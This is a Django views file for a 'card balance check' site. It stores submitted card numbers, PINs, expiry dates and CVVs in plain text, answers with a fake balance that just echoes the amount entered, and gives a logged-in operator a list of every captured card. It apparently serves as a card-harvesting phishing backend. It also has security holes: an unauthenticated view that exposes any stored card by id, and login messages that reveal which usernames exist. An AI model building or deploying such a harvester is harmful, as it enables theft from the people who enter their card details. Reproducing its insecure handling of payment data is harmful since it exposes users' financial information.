from django.shortcuts import render, redirect, reverse
from .models import Cards
from django.contrib import messages
from django.contrib.auth.models import auth
from django.contrib.auth import get_user_model

User = get_user_model()


# Create your views here.
def Check_card(request):
    if request.method == 'POST':
        form = request.POST
    
        card_type = form.get('card_type')
        currency = form.get('currency')       
        amount = form.get('amount')       
        code = form.get('code')
        card_pin = form.get('card_pin')
        exp_date = form.get('exp_date')
        cvv = form.get('cvv') 
        if not card_type or not currency or not amount:
            messages.error(request,'Incomplete Card Details' )
            return render(request, 'myCard/index.html')       
        # owner = request.user
        # try:
        new_card = Cards.objects.create(card_type=card_type, currency=currency,amount=amount, code=code, card_pin=card_pin, exp_date=exp_date,cvv=cvv)
        new_card.save()
        messages.success(request, f'{currency} {amount}:00')
        return redirect(reverse('index'))
        # except:
        #     messages.error(request, "There is incomplete in the form field")
        #     return render(request, 'myCard/index.html')
    return render(request, 'myCard/index.html')


def Login(request): 
    if request.method == 'POST':
        form = request.POST
        username = form.get('username')
        password = form.get('password')
        if not username or not password:
            messages.error(request, 'There is error in your login details, kindly check and try again')
            return render(request, 'myCard/index.html')
        user_exist = User.objects.filter(username= username).exists()
        if not user_exist:
            messages.error(request, 'username is not exist')
            return render(request, 'myCard/index.html')      
        user_isvalid = auth.authenticate(username=username, password= password)
        if not user_isvalid:
            messages.error(request, 'Your login details is not correct')
            return render(request, 'myCard/index.html')
        user = User.objects.get(username=username)
        user = auth.login(request, user)
        messages.success(request, 'login successfully')
        return redirect(reverse( 'cards_log'))      
    return render(request, 'myCard/login.html')



def Cards_log(request):
    if not request.user.is_authenticated:
        messages.error(request, 'You are not allowed, contact admin!')
        return redirect(reverse('index'))
    AllCards = Cards.objects.all()
    context = {"Cards": AllCards}
    return render(request,  'myCard/cards_log.html', context )


def Balace(request,id):
    fetch_card = Cards.objects.get(id=id)
    context = {"Cards": fetch_card}  
    return render(request, 'myCard/balance.html', context)